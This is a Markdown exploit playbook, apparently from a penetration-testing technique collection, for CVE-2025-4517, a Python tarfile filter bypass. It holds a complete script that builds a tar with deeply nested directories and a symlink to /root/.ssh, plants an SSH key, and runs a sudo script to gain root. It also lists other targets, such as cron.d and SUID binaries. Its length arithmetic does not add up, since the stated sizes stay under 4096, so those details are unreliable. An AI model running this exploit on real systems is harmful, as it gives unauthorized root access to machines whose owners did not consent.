# Python tarfile Data Filter Bypass (CVE-2025-4517)

## When this applies

- **Category**: Advanced Privilege Escalation
- **Affected versions**: Python 3.12.0–3.12.10, 3.13.0–3.13.3
- **Fixed in**: Python 3.12.11, 3.13.4+
- A Python script you can supply a tar file to is run with elevated privileges (sudo, cron, setuid wrapper).
- The script calls `tarfile.extractall(filter="data")` (or `filter="fully_trusted"` is NOT used).
- Goal: bypass the safety filter to write outside the extraction directory — typically into `/root/.ssh/authorized_keys`.

## Description

The `tarfile.extractall(filter="data")` safety filter introduced in Python 3.12 is intended to block path traversal and symlink escapes. It calls `os.path.realpath()` to resolve symlinks before checking whether extracted paths stay within the target directory. However, `os.path.realpath()` silently stops resolving symlinks when the total path length exceeds `PATH_MAX` (4096 bytes on Linux). By nesting directories with long names to exceed this limit, an attacker can include a symlink that points outside the extraction directory — the filter passes it unresolved.

## Trigger Conditions

- `sudo -l` reveals a Python script that accepts a user-supplied tar file
- The script calls `tarfile.extractall(filter="data")` (or `filter="fully_trusted"` is NOT used)
- Python version is in the vulnerable range

## Steps

```bash
# 1. Generate a malicious tar archive
python3 -c "
import tarfile, io, os

tar = tarfile.open('exploit.tar', 'w')

# Create ~16 levels of nested dirs with ~238-char names to exceed PATH_MAX
path = ''
for i in range(16):
    dirname = chr(ord('a') + i) * 238
    path = os.path.join(path, dirname)
    info = tarfile.TarInfo(name=path + '/')
    info.type = tarfile.DIRTYPE
    info.mode = 0o755
    tar.addfile(info)

# Add symlink at deepest level pointing to target directory
symlink_path = os.path.join(path, 'link')
info = tarfile.TarInfo(name=symlink_path)
info.type = tarfile.SYMTYPE
info.linkname = '/root/.ssh'
tar.addfile(info)

# Add authorized_keys file that follows the symlink
keydata = open(os.path.expanduser('~/.ssh/id_rsa.pub')).read().encode()
info = tarfile.TarInfo(name=os.path.join(path, 'link', 'authorized_keys'))
info.size = len(keydata)
tar.addfile(info, io.BytesIO(keydata))

tar.close()
print('exploit.tar created')
"

# 2. Run the vulnerable sudo script
sudo /path/to/script.py exploit.tar

# 3. SSH as root
ssh root@localhost
```

## Verifying success

- `ssh root@localhost id` returns `uid=0(root)`.

## Key Notes

- The total nested path must exceed 4096 bytes — 16 directories × 238 chars each ≈ 3808 + separators ≈ 3824, plus the symlink name pushes past 4096
- Adjust nesting depth/name length if needed — the critical threshold is PATH_MAX (4096 on Linux, 1024 on some BSDs)
- If no SSH key exists, generate one first: `ssh-keygen -t rsa -f ~/.ssh/id_rsa -N ""`
- Alternative targets: write a cron job to `/etc/cron.d/`, overwrite a SUID binary, or write to `/root/.bashrc`

## Tools

- python3 (3.12.x or 3.13.x in vulnerable range)
- tar (for inspecting archive)
